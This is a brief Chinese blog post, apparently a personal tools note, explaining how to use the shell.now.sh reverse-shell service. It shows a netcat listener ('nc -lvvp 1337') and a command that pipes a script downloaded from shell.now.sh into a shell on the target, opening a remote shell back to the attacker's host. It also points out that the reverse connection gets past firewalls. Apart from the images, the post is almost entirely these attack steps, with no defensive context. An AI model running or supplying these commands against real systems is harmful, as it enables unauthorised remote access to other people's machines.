---
title: reverse-shell
date: 2018-02-03 14:26:37
tags:
	- tools
categories:
	- tools

---

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg)
<!--more-->

### 前言

将`Shell`作为服务反向 - `https://shell.now.sh`

在大多数类`Unix`系统上都可以使用的反向`shell`。

检测目标上的可用软件并运行适当的有效负载。

因为这是一个反向连接，所以它可以穿过防火墙并连接到互联网。



`github`项目地址：
[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)




### 步骤

#### 1、监听端口
    nc -lvvp 1337

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3asm9s45j30rl0efweg.jpg)

#### 2、在目标上执行反向shell


    curl https://shell.now.sh/主机名/域名或者ip:1337 | SH

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3aurqh80j30ho04gq2v.jpg)



#### 3、得到shell

![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3avdpsuqj30rl0efmx7.jpg)


**总结：**

- 学会了反向`shell`




